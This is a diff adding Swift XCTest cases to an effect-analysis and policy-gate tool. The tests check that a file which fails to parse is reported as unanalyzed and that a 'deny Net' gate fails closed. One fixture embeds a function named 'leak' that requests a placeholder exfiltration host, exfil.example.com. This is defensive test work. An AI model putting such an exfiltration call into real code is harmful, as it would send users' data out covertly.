@@ -77,6 +77,78 @@ final class CompletenessManifestTests: XCTestCase {
         XCTAssertEqual(un?.first?["reason"] as? String, "source failed to read")
     }
 
+    /// A FILE THAT DID NOT PARSE IS UNANALYZED TOO — and this engine could not tell until now, because
+    /// `Parser.parse` is error-TOLERANT: it always returns a tree and never throws, so a syntax error was
+    /// indistinguishable from clean source and the file counted as fully analyzed.
+    ///
+    /// The consequence is not a missing hedge, it is a GREEN GATE OVER Net. Error recovery folds the
+    /// declarations after the bad token into the broken function's body, so the effect is MISATTRIBUTED
+    /// rather than lost — and the real owner vanishes from `functions`, which under ⟨0.21⟩ is a positive
+    /// claim of PURITY over a function that performs Net. Measured before the fix, two trees whose only
+    /// difference is one unparseable declaration:
+    ///
+    ///     well-formed        functions: [Hidden.leak -> Net]    `deny Net Hidden`  exit 1
+    ///     one syntax error   functions: [nope -> Net]           `deny Net Hidden`  exit 0, ok: true
+    ///
+    /// Found by conformance PART 29 (P5, incomplete-vs-violation dominance) on its first honest run.
+    ///
+    /// BOTH DIRECTIONS ARE ASSERTED. The clean control matters as much as the failing row: hedging on
+    /// parser WARNINGS instead of errors, or on any diagnostic at all, would flood `unanalyzed` with files
+    /// candor read perfectly well — and a manifest that cries wolf is how the disclosure channel stops
+    /// being read.
+    func testSourceThatFailedToParseIsUnanalyzedAndTheGateFailsClosed() throws {
+        let bin = try ProcessHarness.binaryURL(for: type(of: self))
+        let root = try app()
+        defer { try? FileManager.default.removeItem(at: root) }
+        let bad = root.appendingPathComponent("Sources/App/Broken.swift")
+        try #"""
+        import Foundation
+        func nope( {{{ <<< not swift
+        enum Hidden {
+            static func leak() {
+                _ = URLSession.shared.dataTask(with: URL(string: "https://exfil.example.com/x")!)
+            }
+        }
+        """#.write(to: bad, atomically: true, encoding: .utf8)
+
+        let r = try ProcessHarness.run(bin, [root.path, "--json"])
+        XCTAssertEqual(r.code, 0, "a bare scan discloses rather than failing: \(r.err)")
+        let env = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
+        let un = env?["unanalyzed"] as? [[String: Any]]
+        XCTAssertEqual(un?.count, 1, "the unparseable file must be machine-legible in `unanalyzed`")
+        XCTAssertTrue((un?.first?["path"] as? String ?? "").contains("Broken"),
+                      "the entry names the offending file")
+        XCTAssertTrue((un?.first?["reason"] as? String ?? "").contains("failed to parse"),
+                      "…and says it was a PARSE failure, distinct from the unreadable-file reason")
+
+        // THE GATE, which is where this cost something: `deny Net Hidden` read GREEN before the fix.
+        let pol = root.appendingPathComponent("net.policy")
+        try "deny Net Hidden\n".write(to: pol, atomically: true, encoding: .utf8)
+        let verdict = root.appendingPathComponent("v.json")
+        let gated = try ProcessHarness.run(bin, [root.path, "--policy", pol.path, "--gate-json", verdict.path])
+        XCTAssertNotEqual(gated.code, 0,
+            "a gate cannot be GREEN over a file that did not parse — this exited 0 with ok:true while the "
+            + "unparsed region performs Net: \(gated.err)")
+        let v = try JSONSerialization.jsonObject(with: Data(contentsOf: verdict)) as? [String: Any]
+        XCTAssertEqual(v?["ok"] as? Bool, false, "ok:false — the gate did not certify")
+        XCTAssertEqual(v?["incomplete"] as? Bool, true, "and the verdict says WHY, machine-readably")
+    }
+
+    /// THE CONTROL FOR THE ROW ABOVE, and it is the half that keeps the fix honest: a package whose files
+    /// all parse must record NO `unanalyzed` at all. Without this, "detect parse errors" and "hedge on
+    /// everything" are indistinguishable, and the second passes the row above just as well.
+    func testACleanPackageRecordsNoParseFailure() throws {
+        let bin = try ProcessHarness.binaryURL(for: type(of: self))
+        let root = try app()
+        defer { try? FileManager.default.removeItem(at: root) }
+        let r = try ProcessHarness.run(bin, [root.path, "--json"])
+        XCTAssertEqual(r.code, 0, r.err)
+        let env = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
+        XCTAssertNil(env?["unanalyzed"],
+                     "a package that parses cleanly must carry no `unanalyzed` — a manifest that cries "
+                     + "wolf is how the disclosure channel stops being read")
+    }
+
     // Gap 2 (c): a configured gate over it → verdict {ok:false, incomplete:true, unanalyzed:[…]} + exit 2;
     // and a real violation still dominates (exit 1) while still disclosing the incompleteness.
     func testConfiguredGateOverUnanalyzedFailsClosed() throws {
